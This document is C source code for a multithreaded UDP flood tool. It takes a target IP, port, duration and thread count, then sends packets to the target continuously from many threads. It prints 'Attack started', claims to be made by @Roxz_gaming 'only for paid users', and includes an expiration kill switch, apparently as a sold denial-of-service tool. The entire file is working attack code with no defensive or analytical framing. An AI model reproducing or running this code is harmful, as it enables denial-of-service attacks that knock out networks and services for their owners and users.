#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define BUFFER_SIZE 900
#define EXPIRATION_YEAR 2025
#define EXPIRATION_MONTH 1
#define EXPIRATION_DAY 27

char *ip;
int port;
int duration;
int stopFlag = 0;

pthread_mutex_t stopMutex = PTHREAD_MUTEX_INITIALIZER;

void checkExpiration() {
    struct tm expirationDate = {0};
    expirationDate.tm_year = EXPIRATION_YEAR - 1900;
    expirationDate.tm_mon = EXPIRATION_MONTH - 1;
    expirationDate.tm_mday = EXPIRATION_DAY;

    time_t expirationTime = mktime(&expirationDate);
    if (time(NULL) > expirationTime) {
        fprintf(stderr, "This file is closed by @Roxz_gaming.\n");
        exit(1);
    }
}

void *sendUDPTraffic(void *arg) {
    int userID = *((int *)arg);
    struct sockaddr_in serverAddr;
    int sock;
    char buffer[BUFFER_SIZE] = "UDP traffic test";
    time_t endTime = time(NULL) + duration;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        fprintf(stderr, "User %d: Failed to create socket\n", userID);
        return NULL;
    }

    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &serverAddr.sin_addr) <= 0) {
        fprintf(stderr, "User %d: Invalid IP address\n", userID);
        close(sock);
        return NULL;
    }

    while (time(NULL) < endTime) {
        pthread_mutex_lock(&stopMutex);
        if (stopFlag) {
            pthread_mutex_unlock(&stopMutex);
            break;
        }
        pthread_mutex_unlock(&stopMutex);

        // Send 10 packets at a time
        for (int i = 0; i < 10; i++) {
            if (sendto(sock, buffer, strlen(buffer), 0, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) < 0) {
                fprintf(stderr, "User %d: Send failed\n", userID);
            }
        }
    }

    close(sock);
    return NULL;
}

void expirationCheckThread() {
    while (1) {
        pthread_mutex_lock(&stopMutex);
        if (stopFlag) {
            pthread_mutex_unlock(&stopMutex);
            break;
        }
        pthread_mutex_unlock(&stopMutex);

        checkExpiration();
        sleep(3600); // Check every hour
    }
}

void signalHandler(int sig) {
    pthread_mutex_lock(&stopMutex);
    stopFlag = 1;
    pthread_mutex_unlock(&stopMutex);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        exit(1);
    }

    ip = argv[1];
    port = atoi(argv[2]);
    duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    checkExpiration();

    // Print attack parameters
    printf("Attack started\n");
    printf("IP: %s\n", ip);
    printf("PORT: %d\n", port);
    printf("TIME: %d seconds\n", duration);
    printf("THREADS: %d\n", threads);
    printf("File is made by @Roxz_gaming only for paid users.\n");

    signal(SIGINT, signalHandler);
    signal(SIGTERM, signalHandler);

    pthread_t expirationThread;
    pthread_create(&expirationThread, NULL, (void *)expirationCheckThread, NULL);

    pthread_t *threadsArr = malloc(threads * sizeof(pthread_t));
    for (int i = 0; i < threads; i++) {
        int *userID = malloc(sizeof(int));
        *userID = i;
        pthread_create(&threadsArr[i], NULL, sendUDPTraffic, userID);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(threadsArr[i], NULL);
    }

    free(threadsArr);

    return 0;
}
